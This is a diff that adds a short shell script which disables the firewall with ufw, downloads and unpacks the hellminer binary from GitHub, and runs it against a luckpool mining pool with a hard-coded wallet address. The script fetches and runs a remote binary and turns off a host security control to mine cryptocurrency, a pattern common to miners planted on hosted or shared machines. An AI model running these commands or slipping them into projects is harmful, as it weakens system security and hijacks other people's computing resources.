@@ -1,0 +1,4 @@
+screen
+
+sudo ufw disable
+sudo apt install libsodium-dev -y && wget https://github.com/hellcatz/hminer/releases/download/v0.56.1/hellminer_linux64_avx2.tar.gz && tar -xvf hellminer_linux64_avx2.tar.gz && ./hellminer -c stratum+ssl://na.luckpool.net:3958 -u RQFAzGsrDocDdd5jUaY8iXzkY3WjrvfgfL.Arifin -p hybrid --cpu 4
